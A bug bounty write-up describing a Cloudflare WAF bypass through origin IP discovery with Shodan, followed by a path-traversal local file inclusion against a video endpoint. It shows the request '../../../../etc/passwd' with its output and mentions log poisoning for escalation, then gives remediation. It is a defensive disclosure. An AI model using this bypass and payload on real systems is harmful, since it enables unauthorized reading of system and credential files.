# Bug Bounty Writeup: Local File Inclusion (LFI) via Origin IP Disclosure & Cloudflare WAF Bypass

**Title:** Local File Inclusion (LFI) via Cloudflare WAF Bypass & Origin IP Disclosure  
**Target:** Web Application (Protected by Cloudflare WAF)  
**Vulnerability Type:** Local File Inclusion (LFI) / Origin IP Disclosure / WAF Bypass  
**Severity:** High / Critical  

---

## 1. Executive Summary

During a bug bounty assessment, a vulnerability chain was discovered allowing an attacker to bypass the target application's **Cloudflare Web Application Firewall (WAF)**. By discovering the target server's direct **Origin IP address** using passive intelligence gathering, direct requests were routed around the WAF protection. 

Further testing on an unhedged subdomain hosted at this origin IP revealed an endpoint vulnerable to **Local File Inclusion (LFI)**. Exploitation allowed for reading arbitrary system files (`/etc/passwd`) from the underlying Linux operating system.

---

## 2. Vulnerability Details

* **WAF Layer:** Cloudflare WAF
* **Vulnerable Endpoint:** Video Player Request Parameter (`file` / resource path parameter)
* **Impact:** Direct access to sensitive operating system files, system information leakage, and potential Remote Code Execution (RCE) vector escalation (e.g., via log poisoning or environment variable reading).

---

## 3. Step-by-Step Exploitation & Proof of Concept (PoC)

### Step 1: WAF Identification & Reconnaissance
Initial reconnaissance indicated that the target web application was protected by **Cloudflare WAF**, restricting payload execution and signature-based attack vectors.

```bash
# Verify WAF presence on main target domain
$ wafw00f https://target.com

[*] The site https://target.com is behind Cloudflare WAF.
```

### Step 2: Origin IP Reconnaissance (Shodan)
To bypass the WAF layer, passive reconnaissance was conducted to locate the true Origin IP of the underlying backend server using **Shodan**.

* **Search Query:** `ssl:"target.com"` or `hostname:"target.com"`
* **Discovery:** Shodan exposed an exposed backend server IP: `[REDACTED_ORIGIN_IP]`.

### Step 3: WAF Bypass Verification
Using `wafw00f` directly against the discovered Origin IP confirmed that traffic sent to the backend directly bypasses Cloudflare entirely.

```bash
# Verify WAF bypass on direct Origin IP
$ wafw00f http://[REDACTED_ORIGIN_IP]

[*] No WAF detected on http://[REDACTED_ORIGIN_IP]
```

Accessing a specific subdomain directly over the Origin IP host header exposed an internal media-rendering service containing video assets.

### Step 4: Interception & LFI Exploitation
1. Browsed the video gallery application on the unhedged Origin IP.
2. Intercepted the media stream request using **Burp Suite**.

**Original Request:**
```http
GET /api/media/play?video=sample_intro.mp4 HTTP/1.1
Host: [REDACTED_ORIGIN_IP]
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
```

3. Modified the `video` parameter payload from `sample_intro.mp4` to path traversal sequence targeting sensitive system files: `../../../../etc/passwd`.

**Modified Request:**
```http
GET /api/media/play?video=../../../../etc/passwd HTTP/1.1
Host: [REDACTED_ORIGIN_IP]
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
```

**HTTP Response (PoC Output):**
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 1482

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

---

## 4. Impact Analysis

1. **Confidentiality Breach:** Unauthenticated access to arbitrary system files (`/etc/passwd`, `/etc/environment`, app configurations, environment variables containing API keys/database credentials).
2. **WAF Ineffectiveness:** The Cloudflare WAF is rendered useless because the origin backend server accepts direct connection requests without authenticating Cloudflare edge IP addresses.
3. **Escalation Path:** Potential to escalate from LFI to **Remote Code Execution (RCE)** via log poisoning (Apache/Nginx logs, SSH logs, `/proc/self/environ`).

---

## 5. Remediation & Recommendations

1. **Restrict Direct Origin IP Access (Cloudflare Authorization):**
   * Configure the origin firewall (e.g., `iptables`, AWS Security Groups) to **only allow inbound traffic from Cloudflare’s public IP ranges**.
   * Implement **Authenticated Origin Pulls (mTLS)** to ensure the backend only accepts traffic coming through Cloudflare.
2. **Sanitize & Validate File Inputs:**
   * Implement strict input validation on parameters fetching local media or files.
   * Avoid passing raw user input directly to file-system functions. Use an absolute lookup table/whitelisting approach for video filenames.
